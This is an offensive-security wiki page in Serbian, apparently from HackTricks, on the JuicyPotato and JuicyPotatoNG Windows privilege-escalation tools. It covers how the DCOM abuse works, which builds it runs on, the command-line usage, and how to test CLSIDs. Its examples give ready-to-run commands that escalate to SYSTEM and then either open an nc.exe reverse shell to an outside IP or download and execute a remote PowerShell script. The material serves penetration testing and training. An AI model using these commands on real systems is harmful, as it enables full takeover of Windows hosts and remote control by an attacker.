# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato je zastareo. Uglavnom radi na Windows verzijama do Windows 10 1803 / Windows Server 2016. Microsoft izmene uvedene počev od Windows 10 1809 / Server 2019 pokvarile su originalnu tehniku. Za te buildove i novije verzije razmotrite moderne alternative kao što su PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato i druge. Pogledajte stranicu ispod za ažurirane opcije i način upotrebe.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (zloupotreba zlatnih privilegija) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Začinjena verzija alata_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, sa malo dodatnog soka, odnosno **još jedan alat za Local Privilege Escalation, od Windows Service Accounts do NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### juicypotato možete preuzeti sa [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Kratke napomene o kompatibilnosti

- Pouzdano radi do Windows 10 1803 i Windows Server 2016 kada trenutni kontekst ima SeImpersonatePrivilege ili SeAssignPrimaryTokenPrivilege.
- Microsoft hardening u Windows 10 1809 / Windows Server 2019 i novijim verzijama onemogućava njegov rad. Za te buildove prednost dajte gore navedenim alternativama.

### Sažetak <a href="#summary" id="summary"></a>

[**Iz juicy-potato Readme datoteke**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i njegove [varijante](https://github.com/decoder-it/lonelypotato) koriste lanac za eskalaciju privilegija zasnovan na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [servisu](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), koji ima MiTM listener na `127.0.0.1:6666`, kada imate privilegije `SeImpersonate` ili `SeAssignPrimaryToken`. Tokom pregleda Windows builda pronašli smo okruženje u kojem je `BITS` namerno onemogućen, a port `6666` zauzet.

Odlučili smo da weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Pozdravite Juicy Potato**.

> Za teoriju pogledajte [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i pratite lanac linkova i referenci.<sup>[[4]](#references)</sup>

Pored `BITS`, može se zloupotrebiti nekoliko COM servera. Oni samo treba da:

1. budu instancirani od strane trenutnog korisnika, obično „service user“-a koji ima impersonation privilegije
2. implementiraju `IMarshal` interfejs
3. rade kao korisnik sa povišenim privilegijama (SYSTEM, Administrator, …)

Nakon testiranja dobili smo i testirali obimnu listu [zanimljivih CLSID-ova](http://ohpe.it/juicy-potato/CLSID/) na nekoliko Windows verzija.

### Juicy detalji <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vam omogućava da:<sup>[[1]](#references)</sup>

- **Ciljni CLSID** _izaberite bilo koji CLSID koji želite._ [_Ovde_](http://ohpe.it/juicy-potato/CLSID/) _možete pronaći listu organizovanu prema OS-u._
- **COM Listening port** _definišite COM listening port koji vam odgovara (umesto hardkodovanog marshalled porta 6666)_
- **COM Listening IP address** _povežite server sa bilo kojom IP adresom_
- **Process creation mode** _u zavisnosti od privilegija impersonated korisnika možete izabrati:_
- `CreateProcessWithToken` (zahteva `SeImpersonate`)
- `CreateProcessAsUser` (zahteva `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _pokrenite izvršni fajl ili skriptu ako exploitation uspe_
- **Process Argument** _prilagodite argumente pokrenutog procesa_
- **RPC Server address** _za stealthy pristup možete se autentifikovati na eksternom RPC serveru_
- **RPC Server port** _korisno ako želite da se autentifikujete na eksternom serveru, a firewall blokira port `135`…_
- **TEST mode** _uglavnom za potrebe testiranja, odnosno testiranje CLSID-ova. Kreira DCOM i ispisuje korisnika tokena. Pogledajte_ [_ovde za testiranje_](http://ohpe.it/juicy-potato/Test/)

### Upotreba <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Završne misli <a href="#final-thoughts" id="final-thoughts"></a>

[**Iz juicy-potato Readme-a**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Ako korisnik ima privilegije `SeImpersonate` ili `SeAssignPrimaryToken`, onda imate **SYSTEM** privilegije.

Gotovo je nemoguće sprečiti zloupotrebu svih ovih COM Servera. Mogli biste razmotriti izmenu dozvola ovih objekata putem `DCOMCNFG`, ali srećno s tim, jer će to biti izazovno.

Pravo rešenje je zaštititi osetljive naloge i aplikacije koje rade pod nalozima `* SERVICE`. Zaustavljanje `DCOM`-a bi svakako onemogućilo ovaj exploit, ali bi moglo ozbiljno uticati na osnovni OS.

Izvor: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG ponovo uvodi local privilege escalation u stilu JuicyPotato na modernom Windowsu kombinovanjem:<sup>[[2]](#references)</sup>
- DCOM OXID resolution-a do lokalnog RPC servera na izabranom portu, čime se izbegava stari hardkodovani listener na 127.0.0.1:6666.
- SSPI hook-a za hvatanje i impersonation dolazne SYSTEM autentikacije bez potrebe za RpcImpersonateClient, što takođe omogućava CreateProcessAsUser kada je prisutna samo SeAssignPrimaryTokenPrivilege privilegija.
- Trikova za ispunjavanje DCOM activation ograničenja (npr. ranijeg zahteva za INTERACTIVE grupom pri ciljanju PrintNotify / ActiveX Installer Service klasa).

Važne napomene (ponašanje se menja između buildova):<sup>[[2]](#references)</sup>
- Septembar 2022: Početna tehnika je radila na podržanim Windows 10/11 i Server ciljevima koristeći „INTERACTIVE trik“.
- Ažuriranje autora iz januara 2023: Microsoft je kasnije blokirao INTERACTIVE trik. Drugi CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) ponovo omogućava exploitation, ali prema njihovoj objavi samo na Windows 11 / Server 2022.

Osnovna upotreba (više flagova dostupno je u help-u):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Ako ciljate Windows 10 1809 / Server 2019, gde je klasični JuicyPotato zakrpljen, dajte prednost alternativama navedenim na vrhu (RoguePotato, PrintSpoofer, EfsPotato/GodPotato itd.). NG može biti situacioni, u zavisnosti od build-a i stanja servisa.

## Primeri

Napomena: Posetite [ovu stranicu](https://ohpe.it/juicy-potato/CLSID/) za listu CLSID-ova koje možete isprobati.

### Dobijanje obrnutog shell-a pomoću nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Pokrenite novi CMD (ako imate RDP pristup)

![Powershell rev - Pokrenite novi CMD (ako imate RDP pristup): Pokrenite novi CMD (ako imate RDP pristup)](<../../images/image (300).png>)

## Problemi sa CLSID

Često podrazumevani CLSID koji JuicyPotato koristi **ne radi** i exploit ne uspeva. Obično je potrebno više pokušaja da bi se pronašao **funkcionalni CLSID**. Da biste dobili listu CLSID-ova koje treba isprobati za određeni operativni sistem, posetite ovu stranicu:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Provera CLSID-ova**

Najpre će vam biti potrebni neki executables pored juicypotato.exe.

Preuzmite [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i učitajte ga u svoju PS sesiju, a zatim preuzmite i izvršite [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ova skripta će kreirati listu mogućih CLSID-ova za testiranje.

Zatim preuzmite [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(promenite putanju do liste CLSID-ova i do juicypotato executables) i izvršite je. Počeće da isprobava svaki CLSID, a **kada se broj porta promeni, to će značiti da je CLSID uspešno radio**.

**Proverite** funkcionalne CLSID-ove **pomoću parametra -c**

## References

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Pružanje druge šanse alatu JuicyPotato: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Stranica projekta Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Eskalacija privilegija sa servisnih naloga na SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
